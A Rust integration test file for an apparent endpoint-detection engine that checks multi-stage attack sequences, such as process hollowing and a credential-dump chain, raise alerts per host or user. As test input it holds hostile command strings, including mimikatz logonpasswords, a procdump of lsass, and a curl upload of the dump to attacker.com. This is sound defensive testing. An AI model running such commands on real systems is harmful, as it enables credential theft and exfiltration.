//! Integration tests for the SequenceDetector engine.

// NOTE: These tests validate the sequence detection logic end-to-end.
// They use EnrichedEvent::default() stubs since the real pipeline
// requires running eBPF, so we test the core logic independently.

use thor_agent::detection::sequence_detector::{
    SequenceDetector, SequenceRule, SequenceStage, StagePredicate, EntityField,
};
use thor_agent::events::enrichment::EnrichedEvent;
use thor_common::ThreatLevel;
use std::time::Duration;

fn evt(cmd: &str, host: &str) -> EnrichedEvent {
    EnrichedEvent {
        command_line: Some(cmd.to_string()),
        hostname: Some(host.to_string()),
        ..EnrichedEvent::default()
    }
}

fn evt_user(cmd: &str, user: &str) -> EnrichedEvent {
    EnrichedEvent {
        command_line: Some(cmd.to_string()),
        user_id: Some(user.to_string()),
        ..EnrichedEvent::default()
    }
}

/// Test 1: Complete 4-stage Process Hollowing chain triggers exactly one alert.
#[test]
fn test_process_hollowing_complete_chain_produces_one_alert() {
    let detector = SequenceDetector::with_builtin_rules();
    let host = "win-victim-01";

    let a0 = detector.process(&evt("NtCreateProcess CREATE_SUSPENDED explorer.exe", host));
    assert!(a0.is_empty(), "Stage 0 must not alert");

    let a1 = detector.process(&evt("NtUnmapViewOfSection svchost", host));
    assert!(a1.is_empty(), "Stage 1 must not alert");

    let a2 = detector.process(&evt("WriteProcessMemory 8192 bytes injected", host));
    assert!(a2.is_empty(), "Stage 2 must not alert");

    let a3 = detector.process(&evt("SetThreadContext then ResumeThread called", host));
    assert_eq!(a3.len(), 1, "Final stage must produce exactly one alert");
    assert_eq!(detector.completed_count(), 1);
    assert!(a3[0].description.contains("Process Hollowing"));
}

/// Test 2: Stages on different hosts do not cross-contaminate.
#[test]
fn test_different_hosts_independent_sequences() {
    let detector = SequenceDetector::with_builtin_rules();

    // Start a sequence on host-A
    detector.process(&evt("NtCreateProcess CREATE_SUSPENDED", "host-A"));
    detector.process(&evt("NtUnmapViewOfSection", "host-A"));

    // Complete the sequence on host-B (different entity) — should NOT alert
    let alerts = detector.process(&evt("WriteProcessMemory massive injection", "host-B"));
    assert!(alerts.is_empty(), "Stages from host-A should not complete sequence on host-B");

    // Complete on host-A — should alert
    detector.process(&evt("WriteProcessMemory 4096 bytes", "host-A"));
    let alerts = detector.process(&evt("SetThreadContext ResumeThread", "host-A"));
    assert!(!alerts.is_empty(), "Full chain on host-A should alert");
}

/// Test 3: Expired sequences are discarded (simulated by manual eviction).
#[test]
fn test_expired_sequence_not_completed() {
    // Create a custom rule with a very short window (1 second)
    let short_rule = SequenceRule {
        id: "test-short-window".into(),
        title: "Short Window Test".into(),
        description: "Test rule with 1ms window".into(),
        threat_level: ThreatLevel::High,
        window: Duration::from_millis(1), // 1ms window — expires immediately
        tags: vec![],
        stages: vec![
            SequenceStage {
                name: "s0".into(),
                entity_field: EntityField::Hostname,
                predicate: StagePredicate::CommandContains(vec!["STAGE_ZERO".into()]),
            },
            SequenceStage {
                name: "s1".into(),
                entity_field: EntityField::Hostname,
                predicate: StagePredicate::CommandContains(vec!["STAGE_ONE".into()]),
            },
        ],
    };

    let detector = SequenceDetector::new(vec![short_rule]);

    detector.process(&evt("STAGE_ZERO triggered", "expiry-host"));

    // Sleep to let window expire
    std::thread::sleep(Duration::from_millis(10));

    // The window should now be expired — completing stage[1] should NOT alert
    let alerts = detector.process(&evt("STAGE_ONE triggered", "expiry-host"));
    assert!(alerts.is_empty(),
        "Stage[1] should not complete an expired sequence (expected empty, got {} alerts)", alerts.len());
}

/// Test 4: Custom user-level sequence with EntityField::UserId correlation.
#[test]
fn test_user_keyed_sequence_detects_credential_chain() {
    let detector = SequenceDetector::with_builtin_rules();
    let user = "svc-compromised";

    // Stage 0: privilege escalation
    let a0 = detector.process(&evt_user("sudo su root escalating", user));
    assert!(a0.is_empty());

    // Stage 1: credential access
    let a1 = detector.process(&evt_user("mimikatz sekurlsa::logonpasswords", user));
    assert!(a1.is_empty());

    // Stage 2: dump creation
    let a2 = detector.process(&evt_user("procdump -ma lsass lsass.dmp output", user));
    assert!(a2.is_empty());

    // Stage 3: exfiltration
    let a3 = detector.process(&evt_user("curl -F file=@lsass.dmp https://attacker.com", user));
    assert_eq!(a3.len(), 1, "Full cred dump chain should produce alert");
    assert!(a3[0].description.contains("Credential"));
    assert_eq!(detector.completed_count(), 1);
}

/// Test 5: Multiple concurrent sequences on different hosts all complete independently.
#[test]
fn test_multiple_simultaneous_chains() {
    let detector = SequenceDetector::with_builtin_rules();

    let hosts = ["alpha", "beta", "gamma"];
    // Start stage[0] on all hosts
    for host in &hosts {
        detector.process(&evt("NtCreateProcess CREATE_SUSPENDED", host));
    }
    // Stage 1 on all
    for host in &hosts {
        detector.process(&evt("NtUnmapViewOfSection called", host));
    }
    // Stage 2 on all
    for host in &hosts {
        detector.process(&evt("WriteProcessMemory wrote 8192", host));
    }
    // Stage 3 (final) on all — each should produce one alert
    let mut total_alerts = 0;
    for host in &hosts {
        let alerts = detector.process(&evt("SetThreadContext ResumeThread", host));
        total_alerts += alerts.len();
    }

    assert_eq!(total_alerts, 3, "Each of the 3 hosts should produce exactly one alert");
    assert_eq!(detector.completed_count(), 3);
}
